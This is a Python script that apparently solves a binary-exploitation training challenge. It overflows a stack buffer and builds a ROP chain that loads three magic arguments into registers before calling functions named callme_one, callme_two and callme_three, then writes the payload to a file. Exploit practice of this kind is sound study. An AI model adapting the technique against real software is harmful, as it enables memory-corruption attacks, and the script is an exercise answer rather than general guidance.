import struct

local_buffer = b'A'*0x20
rbp_filler = b'B'*0x8

pop_rdi_rsi_rdx = 0x40093c #pop rdi; pop rsi; pop rdx; ret;

callme_one = 0x400720
callme_two = 0x400740
callme_three = 0x4006f0
main_func = 0x400887

rdi = 0xdeadbeefdeadbeef
rsi = 0xcafebabecafebabe
rdx = 0xd00df00dd00df00d

ret_filler = 0x4006be

load_params = struct.pack('<QQQQQ', pop_rdi_rsi_rdx, rdi, rsi, rdx, ret_filler)

rop_chain = local_buffer + rbp_filler
rop_chain += load_params + struct.pack('<Q', callme_one)
rop_chain += load_params + struct.pack('<Q', callme_two)
rop_chain += load_params + struct.pack('<Q', callme_three)
rop_chain += struct.pack('<Q', main_func)


with open("payload_bytes", "wb") as f:
    f.write(rop_chain)